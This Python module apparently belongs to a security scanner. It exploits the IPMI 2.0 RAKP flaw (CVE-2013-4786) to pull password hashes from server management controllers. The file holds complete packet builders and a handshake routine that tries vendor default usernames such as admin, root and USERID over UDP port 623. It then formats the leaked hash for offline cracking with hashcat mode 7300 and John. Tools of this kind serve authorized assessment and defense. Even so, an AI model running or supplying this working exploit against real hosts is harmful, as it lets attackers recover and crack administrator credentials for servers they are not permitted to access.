"""IPMI 2.0 RAKP remote password-hash disclosure (CVE-2013-4786).

The RMCP+ / RAKP key-exchange returns RAKP Message 2 — which carries an HMAC
computed over the session data *with the user's password as the key* — BEFORE
the requester has authenticated. So an unauthenticated attacker who drives the
handshake recovers a crackable hash for any valid username. There is no
BMC-side fix beyond strong passwords; this has been an open exposure since 2013.

Handshake we drive (all over UDP/623):
  1. RMCP+ Open Session Request   → Open Session Response (gives BMC session id)
  2. RAKP Message 1 (username + console nonce) → RAKP Message 2 (BMC nonce,
     GUID, and the HMAC-SHA1 auth code = the hash)

We then format the hash for hashcat -m 7300 and John's `rakp` format.

NOTE: the packet builders + the RAKP2 parser are unit-tested against synthetic
captures; the live handshake is best-effort and never raises into the scan. It
needs confirmation against a real BMC before its output is trusted in a report.
"""

from __future__ import annotations

import logging
import os
import socket
import struct
from typing import Optional

log = logging.getLogger(__name__)

# Usernames worth trying — RAKP2 (and thus the hash) is returned for ANY name
# the BMC knows. These cover the common vendor defaults.
DEFAULT_USERNAMES = ("", "admin", "ADMIN", "root", "USERID", "Administrator")

_RMCP_PLUS = b"\x06\x00\xff\x07"
_CONSOLE_SID = 0xA0A2A3A4
_RAKP1_PRIV = 0x14            # bit4 = name-only lookup, low nibble = ADMIN(4)


# ── Packet builders (pure) ────────────────────────────────────────────────────
def _rmcp_plus(payload_type: int, session_id: int, seq: int,
               payload: bytes) -> bytes:
    """Wrap an RMCP+ payload (auth type 0x06, unencrypted, unauthenticated)."""
    return (_RMCP_PLUS
            + bytes([0x06, payload_type])
            + struct.pack("<I", session_id)
            + struct.pack("<I", seq)
            + struct.pack("<H", len(payload))
            + payload)


def open_session_request(console_sid: int = _CONSOLE_SID) -> bytes:
    """RMCP+ Open Session Request: RAKP-HMAC-SHA1 / HMAC-SHA1-96 / AES-CBC-128."""
    payload = (
        b"\x00"                              # message tag
        + b"\x00"                            # requested max priv (0 = highest)
        + b"\x00\x00"                        # reserved
        + struct.pack("<I", console_sid)     # remote console session id
        + b"\x00\x00\x00\x08\x01\x00\x00\x00"   # auth payload: RAKP-HMAC-SHA1
        + b"\x01\x00\x00\x08\x01\x00\x00\x00"   # integrity: HMAC-SHA1-96
        + b"\x02\x00\x00\x08\x01\x00\x00\x00"   # confidentiality: AES-CBC-128
    )
    return _rmcp_plus(0x10, 0x00000000, 0, payload)


def parse_open_session_response(data: bytes) -> Optional[int]:
    """Return the BMC (managed-system) session id, or None on error/short pkt."""
    if len(data) < 16 + 12:
        return None
    payload = data[16:]
    if payload[1] != 0x00:                   # RMCP+ status code != no-error
        return None
    return struct.unpack("<I", payload[8:12])[0]


def rakp_message_1(managed_sid: int, console_rand: bytes, username: str,
                   priv: int = _RAKP1_PRIV) -> bytes:
    """RAKP Message 1: carries our nonce + the username to look up."""
    uname = username.encode("ascii", errors="ignore")[:16]
    payload = (
        b"\x00"                              # message tag
        + b"\x00\x00\x00"                    # reserved
        + struct.pack("<I", managed_sid)     # BMC session id
        + console_rand                       # 16-byte console nonce
        + bytes([priv])                      # requested priv + name-only lookup
        + b"\x00\x00"                        # reserved
        + bytes([len(uname)])
        + uname
    )
    return _rmcp_plus(0x12, 0x00000000, 0, payload)


def parse_rakp_message_2(data: bytes) -> Optional[dict]:
    """Extract (managed nonce, GUID, HMAC auth code) from RAKP Message 2."""
    if len(data) < 16 + 60:
        return None
    payload = data[16:]
    status = payload[1]
    if status != 0x00:
        return {"status_code": status}      # BMC rejected (e.g. bad username)
    return {
        "status_code": 0,
        "console_sid": payload[4:8],
        "managed_rand": payload[8:24],       # 16-byte BMC nonce
        "managed_guid": payload[24:40],      # 16-byte BMC GUID
        "auth_code": payload[40:60],         # 20-byte HMAC-SHA1 = the hash
    }


def build_hashcat_7300(console_sid: int, managed_sid: int,
                       console_rand: bytes, managed_rand: bytes,
                       managed_guid: bytes, username: str,
                       auth_code: bytes, priv: int = _RAKP1_PRIV) -> dict:
    """Assemble the crackable hash. The HMAC is over this exact byte sequence."""
    uname = username.encode("ascii", errors="ignore")[:16]
    salt = (struct.pack("<I", console_sid) + struct.pack("<I", managed_sid)
            + console_rand + managed_rand + managed_guid
            + bytes([priv, len(uname)]) + uname)
    salt_hex = salt.hex()
    hash_hex = auth_code.hex()
    return {
        "username": username,
        "salt_hex": salt_hex,
        "hash_hex": hash_hex,
        # hashcat -m 7300 wants <salt>:<hash>; John's `rakp` format differs.
        "hashcat_7300": f"{salt_hex}:{hash_hex}",
        "john_rakp": f"$rakp${salt_hex}${hash_hex}",
    }


# ── Orchestrator (best-effort network) ────────────────────────────────────────
def dump_hash(ip: str, port: int = 623, timeout: float = 3.0,
              usernames=DEFAULT_USERNAMES) -> Optional[dict]:
    """Drive the RAKP handshake and return a crackable hash, or None.

    Tries each candidate username with a fresh session; returns the first that
    yields a RAKP Message 2 with an auth code.
    """
    for username in usernames:
        try:
            result = _one_handshake(ip, port, username, timeout)
        except OSError as e:
            log.debug("ipmi rakp %s (%r) failed: %s", ip, username, e)
            continue
        if result:
            return result
    return None


def _one_handshake(ip: str, port: int, username: str,
                   timeout: float) -> Optional[dict]:
    family = socket.AF_INET6 if ":" in ip else socket.AF_INET
    s = socket.socket(family, socket.SOCK_DGRAM)
    s.settimeout(timeout)
    try:
        s.connect((ip, port))
        s.send(open_session_request(_CONSOLE_SID))
        managed_sid = parse_open_session_response(s.recv(1024))
        if not managed_sid:
            return None
        console_rand = os.urandom(16)
        s.send(rakp_message_1(managed_sid, console_rand, username))
        rakp2 = parse_rakp_message_2(s.recv(1024))
        if not rakp2 or rakp2.get("status_code") != 0:
            return None
        out = build_hashcat_7300(
            _CONSOLE_SID, managed_sid, console_rand,
            rakp2["managed_rand"], rakp2["managed_guid"],
            username, rakp2["auth_code"])
        out["finding"] = ("IPMI 2.0 RAKP password-hash disclosure "
                          "(CVE-2013-4786) — crack with `hashcat -m 7300`")
        out["severity"] = "high"
        out["guid"] = rakp2["managed_guid"].hex()
        return out
    finally:
        try:
            s.close()
        except Exception:
            pass
